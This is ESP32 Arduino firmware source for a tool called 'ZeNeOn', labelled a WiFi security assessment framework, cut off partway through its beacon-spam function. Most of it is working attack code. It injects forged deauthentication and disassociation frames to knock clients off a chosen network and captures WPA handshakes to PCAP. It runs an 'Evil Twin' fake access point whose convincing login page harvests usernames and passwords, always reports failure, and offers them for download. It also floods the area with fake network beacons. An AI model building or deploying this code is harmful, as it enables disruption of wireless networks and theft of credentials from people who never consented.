#include "SPIFFS.h"
#include "esp_event.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include <DNSServer.h>
#include <WebServer.h>
#include <WiFi.h>

WebServer server(80);
DNSServer dnsServer;
const byte DNS_PORT = 53;

bool sniffing = false;
bool deauthing = false;
bool spamming = false;
bool evilTwinActive = false;
bool capturingHandshake = false;
unsigned long deauthEndTime = 0;
unsigned long deauthStartTime = 0;
unsigned long lastDeauth = 0;
unsigned long lastSpam = 0;
uint16_t deauthSeq = 0;
int spamCount = 0;
uint32_t deauthPktsSent = 0;
uint32_t totalPacketsCaptured = 0;
uint8_t eapolFramesDetected = 0;

File pcapFile;
String targetSSID = "";
uint8_t targetBSSID[6] = {0};
int targetChannel = 1;
uint8_t ownAPMAC[6] = {0};
String evilTwinSSID = "";
int credentialsCount = 0;

#define MAX_CLIENTS 32
uint8_t clientMACs[MAX_CLIENTS][6];
int clientCount = 0;

struct pcap_hdr_t {
  uint32_t magic_number = 0xa1b2c3d4;
  uint16_t version_major = 2;
  uint16_t version_minor = 4;
  int32_t thiszone = 0;
  uint32_t sigfigs = 0;
  uint32_t snaplen = 65535;
  uint32_t network = 105;
};

struct pcaprec_hdr_t {
  uint32_t ts_sec;
  uint32_t ts_usec;
  uint32_t incl_len;
  uint32_t orig_len;
};

typedef struct {
  uint16_t frame_ctrl;
  uint16_t duration;
  uint8_t addr1[6];
  uint8_t addr2[6];
  uint8_t addr3[6];
  uint16_t seq_ctrl;
} __attribute__((packed)) wifi_ieee80211_mac_hdr_t;

typedef struct {
  wifi_ieee80211_mac_hdr_t hdr;
  uint8_t payload[0];
} __attribute__((packed)) wifi_ieee80211_packet_t;

typedef struct {
  uint8_t llc_header[8];
  uint8_t version;
  uint8_t type;
  uint16_t length;
} __attribute__((packed)) eapol_packet_t;

typedef struct {
  uint8_t descriptor_type;
  uint16_t key_info;
  uint16_t key_length;
  uint64_t replay_counter;
  uint8_t nonce[32];
  uint8_t iv[16];
  uint8_t rsc[8];
  uint8_t id[8];
  uint8_t mic[16];
  uint16_t data_length;
} __attribute__((packed)) eapol_key_packet_t;

void parseMac(String mac, uint8_t *out) {
  sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &out[0], &out[1],
         &out[2], &out[3], &out[4], &out[5]);
}

bool isBroadcast(const uint8_t *mac) {
  return (mac[0] == 0xFF && mac[1] == 0xFF && mac[2] == 0xFF &&
          mac[3] == 0xFF && mac[4] == 0xFF && mac[5] == 0xFF);
}

bool macEquals(const uint8_t *a, const uint8_t *b) {
  return memcmp(a, b, 6) == 0;
}

bool isClientKnown(const uint8_t *mac) {
  for (int i = 0; i < clientCount; i++) {
    if (macEquals(clientMACs[i], mac))
      return true;
  }
  return false;
}

void addClient(const uint8_t *mac) {
  if (clientCount >= MAX_CLIENTS)
    return;
  if (isBroadcast(mac))
    return;
  if (mac[0] == 0 && mac[1] == 0 && mac[2] == 0)
    return;
  if (macEquals(mac, targetBSSID))
    return;
  if (isClientKnown(mac))
    return;
  memcpy(clientMACs[clientCount], mac, 6);
  clientCount++;
  Serial.printf("New client: %02X:%02X:%02X:%02X:%02X:%02X (total: %d)\n",
                mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], clientCount);
}

/* ============ HACKER UI ============ */
String header() {
  return R"rawliteral(
<!DOCTYPE html><html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta charset="UTF-8">
<title>{ZeNeOn}</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{background:#05080f;color:#00d4ff;font-family:'Share Tech Mono','Courier New',monospace;min-height:100vh;padding-bottom:70px;position:relative;overflow-x:hidden}
body::before{content:'';position:fixed;top:0;left:0;right:0;bottom:0;background:repeating-linear-gradient(0deg,rgba(0,140,255,0.03) 0px,transparent 2px,transparent 4px);pointer-events:none;z-index:1;animation:scan 8s linear infinite}
body::after{content:'';position:fixed;top:0;left:0;right:0;bottom:0;background:repeating-linear-gradient(0deg,rgba(0,0,0,0.15),rgba(0,0,0,0.15) 1px,transparent 1px,transparent 2px);pointer-events:none;z-index:2;opacity:0.3}
@keyframes scan{0%{transform:translateY(0)}100%{transform:translateY(20px)}}
@keyframes glow{0%,100%{text-shadow:0 0 10px #00d4ff,0 0 20px #0066ff,0 0 30px #0044cc}50%{text-shadow:0 0 5px #00d4ff,0 0 10px #0066ff}}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}
@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
.top{padding:25px;text-align:center;background:rgba(5,8,20,0.97);border-bottom:2px solid #0066ff;box-shadow:0 0 30px rgba(0,100,255,0.3);position:sticky;top:0;z-index:100;border-radius:0 0 16px 16px}
.top h1{font-size:28px;color:#00d4ff;letter-spacing:4px;animation:glow 4s ease-in-out infinite}
.top h1::before{content:'> '}
.top h1::after{content:' _';animation:blink 1s step-end infinite}
.sub{font-size:11px;opacity:0.6;margin-top:8px;letter-spacing:2px;color:#5599cc}
.container{max-width:800px;margin:0 auto;padding:20px;position:relative;z-index:3}
.card{background:rgba(8,14,30,0.92);border:1px solid rgba(0,100,255,0.4);padding:22px;margin-bottom:16px;border-radius:14px;box-shadow:0 0 15px rgba(0,100,255,0.12),inset 0 0 15px rgba(0,100,255,0.03);transition:box-shadow 0.3s,border-color 0.3s}
.card:hover{box-shadow:0 0 25px rgba(0,140,255,0.25),inset 0 0 20px rgba(0,100,255,0.06);border-color:rgba(0,140,255,0.7)}
.card h3{color:#00d4ff;margin-bottom:12px;font-size:18px;text-shadow:0 0 8px rgba(0,140,255,0.6);letter-spacing:2px;text-transform:uppercase;padding-left:18px;position:relative}
button{width:100%;padding:14px 20px;margin-top:10px;background:rgba(0,30,60,0.7);color:#00d4ff;border:1px solid #0066ff;font-size:15px;font-weight:600;cursor:pointer;transition:all 0.3s;box-shadow:0 0 10px rgba(0,100,255,0.25),inset 0 0 10px rgba(0,100,255,0.08);font-family:'Share Tech Mono','Courier New',monospace;letter-spacing:1px;text-transform:uppercase;position:relative;overflow:hidden;border-radius:10px}
button:disabled{opacity:0.4;cursor:not-allowed}
button:not(:disabled):hover{transform:translateY(-2px);box-shadow:0 0 20px rgba(0,140,255,0.5),inset 0 0 20px rgba(0,100,255,0.15);background:rgba(0,50,100,0.8);color:#fff;text-shadow:0 0 10px #00d4ff}
button:active{transform:translateY(0)}
button.danger{background:rgba(30,5,10,0.7);border-color:#ff0040;color:#ff0040;box-shadow:0 0 10px rgba(255,0,64,0.25),inset 0 0 10px rgba(255,0,64,0.08);border-radius:10px}
button.danger:not(:disabled):hover{box-shadow:0 0 20px rgba(255,0,64,0.5);background:rgba(50,5,15,0.8);color:#fff;text-shadow:0 0 10px #ff0040}
button.secondary{background:rgba(5,15,30,0.7);border-color:#0055cc;color:#55aaff;box-shadow:0 0 10px rgba(0,80,200,0.2);border-radius:10px}
button.secondary:not(:disabled):hover{box-shadow:0 0 20px rgba(0,120,255,0.5);background:rgba(10,30,60,0.8);color:#00d4ff;text-shadow:0 0 10px #0088ff}
input{width:100%;padding:14px;margin-top:10px;background:rgba(5,10,20,0.85);color:#00d4ff;border:1px solid rgba(0,100,255,0.4);font-size:15px;transition:all 0.3s;font-family:'Share Tech Mono','Courier New',monospace;box-shadow:inset 0 0 10px rgba(0,100,255,0.08);border-radius:10px}
input:focus{outline:none;border-color:#00d4ff;box-shadow:0 0 15px rgba(0,140,255,0.35),inset 0 0 15px rgba(0,100,255,0.15)}
input::placeholder{color:rgba(0,160,255,0.35)}
.net-item{background:rgba(8,14,28,0.6);border:1px solid rgba(0,100,255,0.3);padding:14px;margin-top:10px;cursor:pointer;transition:all 0.3s;position:relative;overflow:hidden;border-radius:10px}
.net-item::after{content:'';position:absolute;left:0;top:0;bottom:0;width:3px;background:#0088ff;transform:scaleY(0);transition:transform 0.3s;box-shadow:0 0 10px #0088ff;border-radius:0 3px 3px 0}
.net-item:hover{background:rgba(10,25,50,0.7);border-color:#0088ff;transform:translateX(10px);box-shadow:0 0 15px rgba(0,100,255,0.25)}
.net-item:hover::after{transform:scaleY(1)}
.net-item.selected{background:rgba(10,30,60,0.8);border-color:#00d4ff;box-shadow:0 0 20px rgba(0,140,255,0.4),inset 0 0 20px rgba(0,100,255,0.08)}
.net-item.selected::after{transform:scaleY(1)}
.net-name{font-weight:600;font-size:15px;margin-bottom:4px;color:#00d4ff;text-shadow:0 0 5px rgba(0,140,255,0.5)}
.net-details{font-size:12px;color:#5599cc;opacity:0.9}
.status{padding:12px 15px;background:rgba(5,15,30,0.6);border-left:4px solid #0088ff;margin:12px 0;font-size:13px;color:#00d4ff;position:relative;z-index:1;box-shadow:0 0 10px rgba(0,100,255,0.15);border-radius:0 10px 10px 0}
.status.warning{background:rgba(30,20,0,0.6);border-left-color:#ffaa00;color:#ffaa00;box-shadow:0 0 10px rgba(255,170,0,0.15);border-radius:0 10px 10px 0}
.status.warning::before{content:'\u26a0 '}
.status.error{background:rgba(25,5,10,0.6);border-left-color:#ff0040;color:#ff0040;box-shadow:0 0 10px rgba(255,0,64,0.15);border-radius:0 10px 10px 0}
.status.error::before{content:'\u2716 '}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.hidden{display:none}
.footer{position:fixed;bottom:0;left:0;right:0;text-align:center;padding:12px;background:rgba(5,8,20,0.95);border-top:1px solid rgba(0,100,255,0.3);font-size:11px;color:#5599cc;z-index:100;letter-spacing:1px;backdrop-filter:blur(10px)}
.footer a{color:#00d4ff;text-decoration:none;transition:all 0.3s}
.footer a:hover{color:#fff;text-shadow:0 0 10px #00d4ff}
@media(max-width:600px){.grid{grid-template-columns:1fr}}
</style></head><body>
<div class="top"><h1>{ZeNeOn}</h1><div class="sub">ESP32 WiFi Security Assessment Framework v4.0</div></div>
<div class="container">
)rawliteral";
}

String homeUI() {
  return header() + R"rawliteral(
<div class="card">
<h3>Select Module</h3>
<button onclick="location.href='/deauth'">☢ Deauth Attack</button>
<button class="secondary" onclick="location.href='/evilui'">👁 Evil Twin Attack</button>
<button class="secondary" onclick="location.href='/spamui'">📡 WiFi Spam</button>
</div>
<div class="card">
<h3>System Info</h3>
<div class="status">AP SSID: ZeNeOn | Status: Online | Framework: v4.0</div>
</div>
<div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v4.0</div>
</div></body></html>
)rawliteral";
}

String deauthUI() {
  String h = header() + R"rawliteral(
<div class="card">
<h3>Step 1: Select Target</h3>
<div id="status" class="status hidden"></div>
<div id="networks">
)rawliteral";
  int n = WiFi.scanNetworks(false, true);
  if (n == 0) {
    h += "<div class='status error'>No networks found. Try refreshing.</div>";
  } else {
    for (int i = 0; i < n; i++) {
      String ssid = WiFi.SSID(i);
      if (ssid.length() == 0)
        ssid = "Hidden Network";
      h += "<div class='net-item' id='net" + String(i) +
           "' onclick=\"selectTarget(" + String(i) + ",'" + ssid + "','" +
           WiFi.BSSIDstr(i) + "'," + String(WiFi.channel(i)) + ")\">" +
           "<div><div class='net-name'>" + ssid + "</div>" +
           "<div class='net-details'>CH " + String(WiFi.channel(i)) +
           " | RSSI " + String(WiFi.RSSI(i)) + " dBm | " + WiFi.BSSIDstr(i) +
           "</div></div></div>";
    }
  }
  h += R"rawliteral(
</div>
<button class="secondary" style="margin-top:15px" onclick="location.href='/deauth'">⟳ Rescan Networks</button>
</div>
<div class="card hidden" id="timerCard">
<h3>Step 2: Attack Duration</h3>
<div class="grid">
<button onclick="attack(10)">10 Sec</button>
<button onclick="attack(20)">20 Sec</button>
<button onclick="attack(30)">30 Sec</button>
<button onclick="attack(60)">60 Sec</button>
</div>
<div id="clientInfo" class="status hidden" style="margin-top:15px"></div>
</div>
<div class="card">
<h3>Packet Capture</h3>
<button class="secondary" onclick="sniff()" id="sniffBtn">Start Sniffing</button>
<button class="secondary" onclick="location.href='/download'" id="dlBtn">Download PCAP</button>
<button class="danger" onclick="stopAll()">⬛ Stop All</button>
</div>
<button class="secondary" onclick="location.href='/'">← Back to Home</button>
<script>
let targetSSID='',selectedId=-1,clientPoll=null;
function selectTarget(id,s,b,c){
  if(selectedId>=0) document.getElementById('net'+selectedId).classList.remove('selected');
  selectedId=id;
  document.getElementById('net'+id).classList.add('selected');
  fetch('/target?ssid='+encodeURIComponent(s)+'&bssid='+b+'&ch='+c)
  .then(r=>r.text()).then(d=>{
    targetSSID=s;
    document.getElementById('status').className='status';
    document.getElementById('status').classList.remove('hidden');
    document.getElementById('status').innerHTML='⚡ Target Locked: '+s+' (CH '+c+')<br>Scanning for clients...';
    document.getElementById('timerCard').classList.remove('hidden');
    if(clientPoll) clearInterval(clientPoll);
    clientPoll=setInterval(function(){
      fetch('/clients').then(r=>r.text()).then(d=>{
        if(d!='0'){
          document.getElementById('clientInfo').classList.remove('hidden');
          document.getElementById('clientInfo').innerHTML='Found '+d+' clients (targeted deauth enabled)';
        }
      });
    },2000);
  });
}
function attack(t){
  if(!targetSSID){
    document.getElementById('status').className='status warning';
    document.getElementById('status').classList.remove('hidden');
    document.getElementById('status').innerHTML='Select a target first';
    return;
  }
  fetch('/attack?time='+t).then(r=>r.text()).then(d=>{
    document.getElementById('status').className='status';
    document.getElementById('status').innerHTML='☢ Deauth Running '+t+'s on '+targetSSID;
    let counter=t;
    let iv=setInterval(function(){
      counter--;
      if(counter<=0){
        clearInterval(iv);
        fetch('/deauthstats').then(r=>r.text()).then(d=>{
          document.getElementById('status').innerHTML='✓ Attack done. '+d+' packets sent';
        });
      } else {
        document.getElementById('status').innerHTML='☢ Deauth... '+counter+'s remaining on '+targetSSID;
      }
    },1000);
  });
}
function sniff(){
  fetch('/sniff').then(r=>r.text()).then(d=>{
    document.getElementById('status').className='status';
    document.getElementById('status').classList.remove('hidden');
    document.getElementById('status').innerHTML='Packet capture started';
    document.getElementById('sniffBtn').disabled=true;
  });
}
function stopAll(){
  if(clientPoll) clearInterval(clientPoll);
  fetch('/stop').then(r=>r.text()).then(d=>{
    document.getElementById('status').className='status';
    document.getElementById('status').classList.remove('hidden');
    document.getElementById('status').innerHTML='All operations stopped';
    document.getElementById('sniffBtn').disabled=false;
  });
}
</script>
<div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v4.0</div>
</div></body></html>
)rawliteral";
  return h;
}

String evilUI() {
  return header() + R"rawliteral(
<div class="card">
<h3>Evil Twin Attack</h3>
<p style="margin-bottom:15px;opacity:0.7">Create a fake AP with captive portal to harvest credentials</p>
<input id="s" placeholder="Enter target SSID name" value="">
<button onclick="startEvil()">👁 Launch Evil Twin</button>
<button class="danger" onclick="stopEvil()">⬛ Stop Evil Twin</button>
<button class="secondary" onclick="getCreds()">⬇ Download Credentials</button>
<div id="status" class="status hidden"></div>
<div id="credCount" class="status hidden" style="margin-top:10px"></div>
</div>
<button class="secondary" onclick="location.href='/'">← Back to Home</button>
<script>
let credPoll=null;
function startEvil(){
  let ssid=document.getElementById('s').value;
  if(!ssid){
    document.getElementById('status').className='status warning';
    document.getElementById('status').classList.remove('hidden');
    document.getElementById('status').innerHTML='Enter an SSID name';
    return;
  }
  fetch('/evil?ssid='+encodeURIComponent(ssid))
  .then(r=>r.text()).then(d=>{
    document.getElementById('status').className='status warning';
    document.getElementById('status').classList.remove('hidden');
    document.getElementById('status').innerHTML='<strong>Evil Twin Active!</strong><br>Main AP replaced.<br><strong>⟳ RECONNECT to "'+ssid+'" now!</strong>';
    pollCreds();
  });
}
function stopEvil(){
  if(credPoll) clearInterval(credPoll);
  fetch('/stopevil').then(r=>r.text()).then(d=>{
    document.getElementById('status').className='status';
    document.getElementById('status').classList.remove('hidden');
    document.getElementById('status').innerHTML='Evil Twin stopped. ZeNeOn restored.';
    document.getElementById('credCount').classList.add('hidden');
  });
}
function getCreds(){ window.location.href='/getcreds'; }
function pollCreds(){
  credPoll=setInterval(function(){
    fetch('/credstats').then(r=>r.text()).then(d=>{
      if(d!='0'){
        document.getElementById('credCount').classList.remove('hidden');
        document.getElementById('credCount').innerHTML='<strong>'+d+' credentials captured!</strong> Click Download.';
      }
    });
  },3000);
}
</script>
<div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v4.0</div>
</div></body></html>
)rawliteral";
}

String spamUI() {
  return header() + R"rawliteral(
<div class="card">
<h3>WiFi Spam</h3>
<p style="margin-bottom:15px;opacity:0.7">Flood the area with fake WiFi networks</p>
<div id="status" class="status hidden"></div>
<div class="grid">
<button onclick="startSpam(10)">10 Networks</button>
<button onclick="startSpam(20)">20 Networks</button>
<button onclick="startSpam(30)">30 Networks</button>
<button onclick="startSpam(50)">50 Networks</button>
</div>
<button class="danger" style="margin-top:15px" onclick="stopSpam()">⬛ Stop Spam</button>
</div>
<button class="secondary" onclick="location.href='/'">← Back to Home</button>
<script>
function startSpam(c){
  fetch('/spam?count='+c).then(r=>r.text()).then(d=>{
    document.getElementById('status').className='status';
    document.getElementById('status').classList.remove('hidden');
    document.getElementById('status').innerHTML='📡 Spamming '+c+' fake networks...';
  });
}
function stopSpam(){
  fetch('/stop').then(r=>r.text()).then(d=>{
    document.getElementById('status').className='status';
    document.getElementById('status').classList.remove('hidden');
    document.getElementById('status').innerHTML='Spam stopped';
  });
}
</script>
<div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v4.0</div>
</div></body></html>
)rawliteral";
}

String captivePortal() {
  String ssid = evilTwinSSID.length() > 0 ? evilTwinSSID : "Free_WiFi";
  return R"rawliteral(
<!DOCTYPE html><html><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>Network Authentication</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
body{background:#f5f5f5;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:15px}
.box{background:#fff;width:100%;max-width:420px;border-radius:12px;box-shadow:0 8px 25px rgba(0,0,0,0.1);overflow:hidden;position:relative}
.hd{background:linear-gradient(135deg,#0066cc,#004499);color:#fff;padding:30px 25px;text-align:center}
.hd h1{font-size:24px;font-weight:600;margin-bottom:8px}
.hd p{font-size:14px;opacity:0.9}
.badge{background:rgba(255,255,255,0.2);display:inline-block;padding:6px 12px;border-radius:20px;font-size:12px;margin-top:15px}
.ct{padding:30px 25px}
.notice{background:#e8f4fd;border-left:4px solid #0066cc;padding:12px;margin-bottom:25px;font-size:13px;color:#333;border-radius:4px}
.fg{margin-bottom:20px}
.fg label{display:block;margin-bottom:6px;font-weight:500;font-size:14px;color:#333}
.fg input{width:100%;padding:12px 15px;border:1px solid #ddd;border-radius:6px;font-size:16px}
.fg input:focus{outline:none;border-color:#0066cc;box-shadow:0 0 0 3px rgba(0,102,204,0.1)}
.opts{display:flex;justify-content:space-between;align-items:center;margin-bottom:25px;font-size:14px}
.rem{display:flex;align-items:center;gap:8px}
.rem input{width:auto}
.fl{color:#0066cc;text-decoration:none}
.btn{width:100%;padding:14px;background:#0066cc;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;margin-bottom:20px}
.btn:hover{background:#0052a3}
.ft{text-align:center;padding:20px;background:#f5f5f5;font-size:12px;color:#666}
.lo{display:none;position:absolute;top:0;left:0;right:0;bottom:0;background:rgba(255,255,255,0.95);z-index:1000;align-items:center;justify-content:center;flex-direction:column}
.sp{width:40px;height:40px;border:4px solid #ddd;border-top:4px solid #0066cc;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:20px}
@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
.st{font-weight:600;margin-bottom:8px;color:#333}
.sd{font-size:14px;color:#666}
</style></head><body>
<div class="box">
<div class="lo" id="lo"><div class="sp"></div><div class="st" id="stxt">Authenticating...</div><div class="sd" id="sdtl">Please wait</div></div>
<div class="hd"><h1>Network Authentication</h1><p>Secure connection required</p><div class="badge">SSID: )rawliteral" +
         ssid + R"rawliteral(</div></div>
<div class="ct">
<div class="notice"><strong>Security Notice:</strong> Authentication required for internet access.</div>
<form id="lf" onsubmit="doLogin(event)">
<div class="fg"><label>Username or Email</label><input type="text" id="u" name="username" placeholder="Enter username or email" required></div>
<div class="fg"><label>Password</label><input type="password" id="p" name="password" placeholder="Enter password" required></div>
<div class="opts"><label class="rem"><input type="checkbox"> Remember me</label><a href="#" class="fl" onclick="return false">Forgot password?</a></div>
<button type="submit" class="btn">Sign In</button>
</form></div>
<div class="ft"><p>&copy; 2026 Network Services. All rights reserved.</p></div>
</div>
<script>
function doLogin(e){
  e.preventDefault();
  var u=document.getElementById('u').value,p=document.getElementById('p').value;
  document.getElementById('lo').style.display='flex';
  fetch('/submit',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'username='+encodeURIComponent(u)+'&password='+encodeURIComponent(p)}).then(function(r){return r.text()}).then(function(){
    setTimeout(function(){
      document.getElementById('stxt').textContent='Authentication Failed';
      document.getElementById('sdtl').textContent='Invalid credentials. Try again.';
      document.getElementById('sdtl').style.color='#cc2244';
      setTimeout(function(){
        document.getElementById('lo').style.display='none';
        document.getElementById('p').value='';
        document.getElementById('stxt').textContent='Authenticating...';
        document.getElementById('sdtl').textContent='Please wait';
        document.getElementById('sdtl').style.color='#666';
      },2000);
    },1500);
  });
  return false;
}
</script></body></html>
)rawliteral";
}

/* ============ EAPOL / HANDSHAKE ============ */
bool isEAPOLFrame(const uint8_t *payload, uint32_t len) {
  if (len < 36)
    return false;
  if (payload[24] == 0xAA && payload[25] == 0xAA && payload[26] == 0x03 &&
      payload[30] == 0x88 && payload[31] == 0x8E)
    return true;
  return false;
}

uint8_t getEAPOLMessageType(const uint8_t *payload, uint32_t len) {
  if (len < 99)
    return 0;
  uint16_t keyInfo = (payload[37] << 8) | payload[38];
  bool pairwise = (keyInfo & 0x0008) != 0;
  bool install = (keyInfo & 0x0040) != 0;
  bool ack = (keyInfo & 0x0080) != 0;
  bool mic = (keyInfo & 0x0100) != 0;
  if (pairwise) {
    if (ack && !mic && !install)
      return 1;
    if (!ack && mic && !install)
      return 2;
    if (ack && mic && install)
      return 3;
    if (!ack && mic && !install) {
      bool nonceZero = true;
      for (int i = 51; i < 83 && i < (int)len; i++) {
        if (payload[i] != 0) {
          nonceZero = false;
          break;
        }
      }
      if (nonceZero)
        return 4;
      return 2;
    }
  }
  return 0;
}

/* ============ PROMISCUOUS CALLBACK ============ */
void promiscuousCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  uint32_t len = pkt->rx_ctrl.sig_len;
  if (len < 24 || len > 2500)
    return;
  const uint8_t *payload = pkt->payload;
  uint8_t frameType = payload[0] & 0x0C;

  // Client discovery
  if ((deauthing || capturingHandshake) &&
      (targetBSSID[0] != 0 || targetBSSID[1] != 0)) {
    if (frameType == 0x08) {
      uint8_t toDS = payload[1] & 0x01, fromDS = payload[1] & 0x02;
      if (toDS && !fromDS && macEquals(&payload[4], targetBSSID))
        addClient(&payload[10]);
      else if (!toDS && fromDS && macEquals(&payload[10], targetBSSID))
        addClient(&payload[4]);
      else if (toDS && fromDS) {
        if (macEquals(&payload[10], targetBSSID))
          addClient(&payload[4]);
        if (macEquals(&payload[4], targetBSSID))
          addClient(&payload[10]);
      }
    }
    if (frameType == 0x00 && len >= 22 &&
        macEquals(&payload[16], targetBSSID)) {
      if (!macEquals(&payload[4], targetBSSID) && !isBroadcast(&payload[4]))
        addClient(&payload[4]);
      if (!macEquals(&payload[10], targetBSSID) && !isBroadcast(&payload[10]))
        addClient(&payload[10]);
    }
  }

  // EAPOL detection
  if ((sniffing || capturingHandshake) && frameType == 0x08) {
    if (isEAPOLFrame(payload, len)) {
      uint8_t msgType = getEAPOLMessageType(payload, len);
      eapolFramesDetected++;
      if (msgType > 0 && msgType <= 4) {
        Serial.printf("[HANDSHAKE] EAPOL %d/4 | %d bytes | RSSI %d\n", msgType,
                      len, pkt->rx_ctrl.rssi);
      }
    }
  }

  // PCAP writing
  if (sniffing && pcapFile) {
    totalPacketsCaptured++;
    unsigned long timestamp = micros();
    pcaprec_hdr_t rec;
    rec.ts_sec = timestamp / 1000000;
    rec.ts_usec = timestamp % 1000000;
    rec.incl_len = len;
    rec.orig_len = len;
    pcapFile.write((uint8_t *)&rec, sizeof(rec));
    pcapFile.write(payload, len);
    static int pktCount = 0;
    if (++pktCount >= 20) {
      pcapFile.flush();
      pktCount = 0;
    }
  }
}

/* ============ DEAUTH FRAME INJECTION ============ */
void sendRawFrame(uint8_t *frame, int len) {
  esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
  if (result != ESP_OK) {
    static unsigned long lastErrLog = 0;
    if (millis() - lastErrLog > 3000) {
      Serial.printf("[ERROR] Frame TX failed: %s (0x%x)\n",
                    esp_err_to_name(result), result);
      lastErrLog = millis();
    }
  }
  delay(1);
}

void buildDeauthFrame(uint8_t *pkt, const uint8_t *dest, const uint8_t *src,
                      const uint8_t *bssid, uint8_t type, uint16_t reason) {
  memset(pkt, 0, 26); // Clear the packet first
  pkt[0] = type;      // 0xC0 = Deauth, 0xA0 = Disassoc
  pkt[1] = 0x00;      // Flags
  pkt[2] = 0x00;      // Duration
  pkt[3] = 0x00;

  memcpy(&pkt[4], dest, 6);   // Destination
  memcpy(&pkt[10], src, 6);   // Source
  memcpy(&pkt[16], bssid, 6); // BSSID

  // Fixed sequence number with proper 12-bit rotation
  static uint16_t seqNum = 0;
  pkt[22] = (seqNum & 0x0F) << 4;
  pkt[23] = (seqNum >> 4) & 0xFF;
  seqNum = (seqNum + 1) % 4096;

  pkt[24] = reason & 0xFF;
  pkt[25] = (reason >> 8) & 0xFF;
}

void sendDeauthBurst() {
  uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  uint8_t pkt[26];
  uint16_t reasons[] = {0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07};

  // Broadcast deauth + disassoc
  for (int r = 0; r < 3; r++) {
    buildDeauthFrame(pkt, broadcast, targetBSSID, targetBSSID, 0xC0,
                     reasons[r]);
    sendRawFrame(pkt, 26);
    deauthPktsSent++;
  }
  buildDeauthFrame(pkt, broadcast, targetBSSID, targetBSSID, 0xA0, 0x08);
  sendRawFrame(pkt, 26);
  deauthPktsSent++;

  // Targeted unicast to discovered clients
  for (int i = 0; i < clientCount; i++) {
    buildDeauthFrame(pkt, clientMACs[i], targetBSSID, targetBSSID, 0xC0, 0x07);
    sendRawFrame(pkt, 26);
    deauthPktsSent++;
    buildDeauthFrame(pkt, clientMACs[i], targetBSSID, targetBSSID, 0xA0, 0x08);
    sendRawFrame(pkt, 26);
    deauthPktsSent++;
    buildDeauthFrame(pkt, targetBSSID, clientMACs[i], targetBSSID, 0xC0, 0x03);
    sendRawFrame(pkt, 26);
    deauthPktsSent++;
    buildDeauthFrame(pkt, targetBSSID, clientMACs[i], targetBSSID, 0xA0, 0x08);
    sendRawFrame(pkt, 26);
    deauthPktsSent++;
  }

  for (int r = 3; r < 7; r++) {
    buildDeauthFrame(pkt, broadcast, targetBSSID, targetBSSID, 0xC0,
                     reasons[r]);
    sendRawFrame(pkt, 26);
    deauthPktsSent++;
  }
}

/* ============ WIFI SPAM ============ */
void sendBeacon(const char *ssid, int ssidLen, int ch) {
  uint8_t packet[128] = {0};
  int pktLen = 0;
  packet[0] = 0x80;
  packet[1] = 0x00;
  packet[2] = 0x00;
  packet[3] = 0x00;
  memset(&packet[4], 0xFF, 6);
  packet[10] = 0x02 | (random(256) & 0xFE);
  for (int i = 11; i < 16; i++)
    packet[i] = random(256);
  memcpy(&packet[16], &packet[10], 6);
  packet[22] = 0;
  packet[23] = 0;
  unsigned long ts = micros();
  memcpy(&packet[24], &ts, 4);
  memset(&packet[28], 0, 4);
  packet[32] = 0x64;
  packet[33] = 0x00;
  packet[34] = 0x31;
  packet[35] = 0x04;
  pktLen = 36;
  packet[pktLen++] = 0x00;
  packet[pktLen++] = ssidLen;
  memcpy(&packet[pktLen], ssid, ssidLen);
  pktLen += ssidLen;
  packet[pktLen++] = 0x01;
  packet[pktLen++] = 0x08;
  uint8_t rates[] = {0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C};
  memcpy(&packet[pktLen], rates, 8);
  pktLen += 8;
  packet[pktLen++] = 0x03;
  packet[pktLen++] = 0x01;
  packet[pktLen++] = ch;
  esp_wifi_80211_tx(WIFI_IF_STA, packet, pktLen, false);
}

void spamWiFi() {
  static const char *names[] = {
      "WuTangLAN",  "Obi_LAN",    "LAN_Solo",    "BatCave",    "Hogwarts",
      "StarkTower", "The_Shire",  "Matrix",      "SkyNet",     "Iron_LAN",
      "SpiderWeb",  "Yoda_Net",   "McFly",       "007_Net",    "Godzilla",
      "Pika_Net",   "Loading...", "Searching",   "Connect...", "404_Err",
      "Demo_Net",   "Test_Zone",  "Dial_Up",     "56k_Modem",  "Not_Yours",
      "Get_Own",    "No_Free",    "Go_Away",     "Keep_Out",   "Ask_Mom",
      "Pay_Me",     "Dont_Look",  "My_Precious", "Secret",     "Hidden",
      "Nope",       "Swipe_Left", "Try_Again",   "Locked",     "Private",
      "Nacho_Net",  "Taco_Tue",   "Pizza_Hut",   "Free_Beer",  "Send_Cash",
      "Virus_Free", "Buffering",  "Update_Req",  "Offline",    "Rebooting",
      "Slow_Net",   "Bad_Signal", "No_Internet", "Weak_Link"};
